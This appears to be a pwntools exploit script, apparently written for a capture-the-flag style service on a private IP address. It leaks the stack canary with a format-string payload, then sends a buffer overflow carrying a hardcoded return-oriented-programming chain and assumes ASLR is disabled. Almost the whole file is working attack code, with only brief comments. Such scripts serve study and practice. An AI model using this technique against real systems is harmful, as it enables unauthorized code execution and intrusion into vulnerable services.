from pwn import *

# This code is run correctly only if ASLR is turned off
# I didn't create address calculation area and I'll add it ASAP
# This is simple code that connect to server and print '/bin/sh' in client area


LENGTH = 1032+88

p = remote('192.168.0.2', 1337)
print p.recvuntil('choice > ')
p.sendline('2')
p.sendline('%20p'*144)
print p.recvuntil('format >')
canary = p.recvuntil('format >').split(' ')[-3].split('\n')[0]
print canary
p.sendline('')
print p.recvuntil('choice > ')
p.sendline('1')
print p.recvuntil('send ? ')
payload = p64(0x0000000000001143)
payload += p64(0x0000555555555c8b)
payload += p64(0x0000000000000001)
payload += p64(0x7ffff7b04d00)
payload += p64(0x0000555555555c8b)
payload += p64(0x04)
payload += p64(0x7ffff7b04d60)
payload += p64(0x0000555555555c8b)
payload += p64(0x7ffff7b9a177)
payload += p64(0x7ffff7a7d690)
p.sendline(str(LENGTH+1))
p.sendline('a'*1032+p64(int(canary, 16))+payload)
print p.recvuntil('/sh')
print "[*] END"
